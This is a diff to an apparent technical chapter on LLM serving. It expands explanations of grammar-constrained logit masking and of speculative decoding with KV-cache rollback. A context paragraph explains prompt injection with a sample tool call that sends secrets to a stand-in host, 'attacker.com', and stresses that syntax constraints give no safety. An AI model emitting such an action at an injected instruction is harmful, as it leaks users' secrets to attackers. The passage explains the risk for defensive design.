@@ -436,7 +436,25 @@ The residual failure modes are precisely those outside the grammar's expressive 
 \end{algorithm}
 ```
 
-By compiling formal schemas into deterministic automata and applying pre-softmax bitmasks, the runtime achieves an absolute systems guarantee: every emitted token conforms to the target grammar by construction, eliminating deserialization exceptions and collapsing the error-retry tax to unity.
+### Operational mechanics and systems execution
+
+To understand how @algo-grammar-logit-masking executes within a production serving engine (such as Outlines, llama.cpp, or SGLang), we decompose its operation into three distinct systems phases:
+
+1. **Prefix-Closure Verification (Lines 2–13):** The engine iterates across the vocabulary $\mathcal{V}$ to identify tokens whose byte sequences represent legal transitions from current parser state $q$. As established in the prefix closure analysis above, this requires prefix closure: if a token represents an incomplete fragment of a valid terminal (e.g., the string `"tru"` on the path toward `"true"`), the state transition function $\delta$ accepts it and appends token ID $v$ to $\mathcal{T}_{\text{valid}}$. If any byte in the sequence violates the grammar ($\delta = \bot$), the candidate is immediately pruned.
+2. **Pre-Softmax Logit Suppression (Lines 15–18):** Rather than filtering tokens post-generation or attempting to zero probabilities after the softmax kernel, the runtime initializes a masked logit vector $\mathbf{z}^*$ with $-\infty$ and copies over only the unmasked logits of valid candidates ($\mathbf{z}^*[v] \gets \mathbf{z}[v]$ for $v \in \mathcal{T}_{\text{valid}}$). In floating-point arithmetic, $\exp(-\infty) = 0$, guaranteeing that invalid tokens receive zero probability mass while valid candidates naturally renormalize across the denominator $\sum_{v \in \mathcal{T}_{\text{valid}}} \exp(\mathbf{z}^*[v])$ without numerical distortion or division-by-zero exceptions.
+3. **Sampling and State Advancement (Lines 19–20):** The sampling kernel selects token $v^*$ from the masked distribution, and the pushdown automaton advances its state to $q'$ along the decoded byte path $\delta^*(q, \textsc{DecodeBytes}(v^*))$.
+
+#### Hardware trade-offs: Bitmask indexing versus kernel overhead
+
+In an interactive serving loop, computing @algo-grammar-logit-masking from scratch on every autoregressive step would impose an unacceptable CPU bottleneck. If an engine executed byte-level trie lookups for all $128{,}000$ vocabulary tokens on every generated token, the CPU overhead would easily exceed $10\text{ ms}$, negating the throughput of GPU decode kernels.
+
+Production inference systems eliminate this runtime penalty through **precomputed bitmask indexing**:
+
+- **Compiling State Bitsets:** Before serving, the engine compiles the grammar into a deterministic transition table where each parser state $q$ maps directly to a precomputed bitmask tensor $\mathbf{m}_q \in \{0, 1\}^{|\mathcal{V}|}$. For a vocabulary of $|\mathcal{V}| = 128{,}000$ tokens, each bitmask occupies exactly:
+  $$\text{Size}_{\text{bitmask}} = \frac{128{,}000\text{ bits}}{8\text{ bits/byte}} = 16{,}000\text{ bytes} \approx 15.6\text{ KB}$$
+  At $15.6\text{ KB}$ per state, the active bitmask fits entirely inside the L1 data cache of a modern host CPU core (typically $32\text{--}48\text{ KB}$).
+- **Zero-Copy PCIe Transfer:** During decode, the host CPU performs an $\mathcal{O}(1)$ table lookup based on the active state $q$, streaming the 16 KB bitmask to accelerator memory over PCIe 5.0 in under $0.13\,\mu\text{s}$ (against a $128\text{ GB/s}$ bus bandwidth). Alternatively, the bitmask table can reside permanently in GPU HBM, allowing a fused Triton or CUDA logit-bias kernel to apply the mask directly prior to softmax with zero host-device synchronization latency.
+- **Collapsing the Retry Tax:** By enforcing grammatical closure at the sampling layer, the runtime reduces the syntax error rate $p_{\text{err}}$ from an empirical $3\text{--}5\%$ down to exactly zero. In multi-step agent pipelines, this collapses the error-retry latency tax $1 + p_{\text{err}} \cdot \bar{k}_{\text{retry}}$ to unity, ensuring that every tool invocation parses deterministically on the very first attempt.
 
 Yet, this deterministic guarantee carries a dangerous illusion. While an FSM guarantees that an emitted action is syntactically flawless JSON, it provides zero assurance regarding the semantic intent or authorization of that action. A language model governed by a strict grammar will faithfully emit `{"action": "exfiltrate_secrets", "destination": "attacker.com"}` if an adversarial input successfully commands it to do so. The root cause lies not in the output sampler, but at the very entrance of the processor pipeline: large language models process operator instructions and untrusted data in a single, flat token buffer with zero privilege separation. To prevent syntactic correctness from becoming a deterministic vehicle for malicious execution, we must confront the $W \oplus X$ boundary.
 
@@ -628,7 +646,19 @@ where $c = T_q / T_p$ is the ratio of draft to target model forward-pass latency
 \end{algorithm}
 ```
 
-Reclaiming uncommitted speculative cache slots immediately after Phase 3 limits physical memory fragmentation, allowing the serving system to run wide speculation windows without inflating the resident memory tax.
+### Systems execution and memory management in speculative pipelines
+
+To understand why @algo-speculative-decoding-rollback achieves high serving speedups without sacrificing model accuracy, an ML systems engineer must examine how its four phases interact with accelerator hardware:
+
+1. **Phase 1: Lightweight Sequential Drafting (Lines 3–7):** The small draft model $q_\phi$ (typically $1\text{--}3\text{B}$ parameters) generates $K$ candidate tokens sequentially. Because the draft model has $20\text{--}70\times$ fewer parameters than the target model, its autoregressive decode steps stream significantly fewer weight bytes from memory, executing at upwards of $150\text{--}250\text{ tokens/s}$.
+2. **Phase 2: Batched Parallel Verification (Line 8):** The primary target model $p_\theta$ evaluates all $K$ draft tokens concurrently within a single prefill forward pass. This is the pivotal roofline transition: evaluating $K$ tokens simultaneously transforms the target model's execution from a memory-bandwidth-bound matrix-vector product ($M \times K$ with $M=1$) into a compute-bound matrix-matrix multiplication ($M=K$). The memory controller streams the large target model weights (e.g., $140\text{ GB}$ in FP16) from HBM across the on-chip SRAM caches exactly once, amortizing the weight transfer cost across all $K$ candidate tokens.
+3. **Phase 3: Rejection Sampling with Zero Distribution Shift (Lines 10–24):** The algorithm sequentially evaluates acceptance probability $\alpha_i = \min(1, \mathbf{P}[i, \hat{y}_i] / q_\phi(\hat{y}_i))$. The mathematical beauty of modified rejection sampling is that it guarantees zero output degradation:
+   - When a draft token is accepted ($u \le \alpha_i$), it is guaranteed to follow the target model's true posterior.
+   - When a draft token is rejected ($u > \alpha_i$), the algorithm does not restart from scratch; instead, it samples a replacement token $y_{\text{corr}}$ directly from the normalized positive residual distribution $\max(0, \mathbf{P}[i] - q_\phi)$. This guarantees that the marginal distribution of the emitted token matches the target model $p_\theta$ exactly, with mathematical invariance to the choice of draft model.
+   - If all $K$ candidates are accepted, the target model's next-token logit distribution $\mathbf{P}[K+1]$ is already available at zero marginal compute cost, yielding a "bonus token" that delivers up to $K+1$ tokens in a single target pass.
+4. **Phase 4: Physical KV-Cache Rollback (Line 25):** The memory-systems linchpin occurs when an early rejection occurs at step $i < K$. During Phase 2, the target model's attention kernel wrote key-value activations for all $K$ candidates into accelerator HBM up to position $t + K$. If rejection occurs at index $i$, the speculative activations at positions $i+1, \ldots, t+K$ become invalid. The runtime invokes `TruncateKVCache(H, L_commit)` to immediately roll back the sequence allocation pointer in the PagedAttention block table. Failure to reclaim these uncommitted pages would trigger two severe defects:
+   - **Silent State Corruption:** Subsequent decode steps would compute attention over discarded phantom keys, corrupting the transformer's hidden representations.
+   - **Physical Memory Leaks:** Unreclaimed speculative blocks would permanently exhaust GPU page tables, causing premature out-of-memory faults during long-horizon agent trajectories.
 
 ### Why structured outputs exhibit high acceptance rates
 
